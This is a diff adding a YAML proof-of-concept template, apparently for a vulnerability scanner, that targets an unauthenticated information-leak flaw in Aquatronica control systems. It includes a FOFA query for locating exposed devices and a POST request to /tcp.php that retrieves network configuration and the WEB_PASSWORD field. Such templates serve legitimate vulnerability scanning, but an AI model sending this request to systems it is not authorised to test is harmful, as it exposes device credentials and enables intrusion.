@@ -1,0 +1,18 @@
+id: poc-yaml-aquatronica-control-system-tcp-info-leak
+info:
+  name: Aquatronica 控制系统 tcp 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: aquatronica-control-system
+  fofa: title="Aquatronica"
+requests:
+- method: POST
+  path: /tcp.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: function_id=tcp_xml_request&command=WS_GET_NETWORK_CFG
+  expression: status_code == 200 && contains(body,"NetworkConfig") && contains(body,"WEB_PASSWORD")
+    && contains(body,"system_name") && !contains(body,"<")
+variables: {}
+transport: http
